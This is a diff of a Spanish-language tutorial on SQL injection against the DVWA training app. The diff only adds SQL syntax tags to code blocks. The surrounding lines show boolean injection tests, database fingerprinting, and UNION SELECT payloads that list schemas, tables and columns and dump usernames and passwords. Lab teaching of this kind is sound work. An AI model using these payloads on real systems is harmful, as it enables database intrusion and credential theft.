@@ -32,7 +32,7 @@ Bien, sabiendo esto podemos determinar que si inyectamos una condición booleana
 
 Consulta:
 
-```
+```sql
 1’ AND 1 = 1;#
 ```
 
@@ -40,7 +40,7 @@ Consulta:
 
 Consulta:
 
-```
+```sql
 1’ AND 1 = 2;#
 ```
 
@@ -62,7 +62,7 @@ Por lo que:
 
 Consulta:
 
-```
+```sql
 1’ AND ‘a’||’b’ LIKE ‘ab’;#
 ```
 
@@ -70,7 +70,7 @@ Consulta:
 
 Consulta:
 
-```
+```sql
 1’ AND concat(‘a’, ‘b’) LIKE ‘ab’;#
 ```
 
@@ -89,7 +89,7 @@ Más información acerca de las diferentes columnas: [Documentación de MySQL](h
 
 Consulta:
 
-```
+```sql
 -1’
 UNION SELECT schema_name, null
 FROM INFORMATION_SCHEMA.SCHEMATA;#
@@ -107,7 +107,7 @@ Mas informacion de las diferentes columnas: [Documentación de MySQL](https://de
 
 Por lo cual si quisiéramos obtener todas las tablas de una BD inyectamos la siguiente consulta:
 
-```
+```sql
 -1’
 UNION SELECT table_name, null
 FROM INFORMATION_SCHEMA.TABLES
@@ -129,7 +129,7 @@ Más información acerca de las diferentes columnas: [Documentación de MySQL](h
 
 Por lo tanto, para obtener las diferentes columnas de la tabla users debemos inyectar la siguiente consulta:
 
-```
+```sql
 -1’
 UNION SELECT column_name, column_type
 FROM INFORMATION_SCHEMA.COLUMNS
@@ -142,7 +142,7 @@ Pues ya sabemos la tabla y sus columnas, una vez aquí ya podemos consultar, añ
 
 Consulta:
 
-```
+```sql
 -1’
 UNION SELECT user, password
 FROM dvwa.users;#
